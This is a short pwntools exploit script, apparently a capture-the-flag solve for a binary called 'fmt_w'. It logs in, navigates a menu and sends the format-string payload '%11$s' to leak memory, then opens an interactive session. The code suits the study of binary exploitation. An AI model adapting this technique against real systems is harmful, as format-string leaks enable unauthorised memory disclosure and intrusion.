from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fmt_w"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

io.sendlineafter("ch", b"1")
io.sendlineafter("username", b"aolnnin")
io.sendlineafter("passwd", b"ninnloa")
io.sendlineafter("ch", b"2")
io.sendline(b"%11$s")
io.sendlineafter(b"ch", b"3")


io.interactive()
